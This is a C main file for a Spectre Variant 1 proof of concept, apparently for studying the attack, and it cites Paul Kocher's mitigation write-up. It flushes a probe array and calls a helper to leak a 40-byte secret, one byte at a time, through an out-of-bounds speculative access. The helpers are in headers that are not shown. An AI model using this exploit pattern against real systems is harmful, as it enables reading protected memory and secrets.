#include <stdio.h>
#include <stdint.h>
#include <malloc.h>
#include <unistd.h>
#include <stdlib.h>
#include "fnr_helper.h"
#include "spectre_helper.h"

// Functions are taken from
// https://www.paulkocher.com/doc/MicrosoftCompilerSpectreMitigation.html

// Code for Spectre Variant 1
int main(){
	// initialize the array
	for (int i = 0; i < 256 * 4096; i++){
		array[i] = i % 256;
	}
	// steal the secret, secret is 40 byte long
	
	for(int i =0; i < 40; i++){
		clflush_array(array);

		// initialize scores
		int* scores =(int*) malloc(256 * sizeof(int));
		for (int i = 0; i < 256; i++)
		{
			scores[i] = 0;
		}
		// out of bounds access
		size_t larger_x = (size_t)(secret - (char*)buffer + i);
		
		steal_byte(scores, larger_x);

		free(scores);
	}
	
	return 0;
}
